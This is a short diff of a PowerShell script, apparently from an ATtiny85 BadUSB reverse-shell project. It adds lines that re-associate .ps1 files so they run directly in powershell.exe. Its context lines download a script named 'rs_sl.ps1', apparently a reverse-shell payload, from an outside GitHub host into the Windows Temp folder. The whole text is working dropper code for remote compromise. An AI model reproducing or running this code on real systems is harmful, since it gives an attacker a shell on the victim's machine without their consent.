@@ -1,3 +1,8 @@
+$dotext = ".ps1"
+$extfile = "powershell"
+C:\Windows\system32\cmd.exe /c assoc $dotext=$extfile
+C:\Windows\system32\cmd.exe /c "ftype $extfile=""C:\Windows\System32\powershell.exe"" ""%1"""
+
 $client = New-Object System.Net.WebClient
 $client.DownloadFile('https://raw.githubusercontent.com/XALM1337X/attiny85_rshell/master/rs_sl.ps1', 'C:\\Windows\\Temp\\rs_sl.ps1')
 
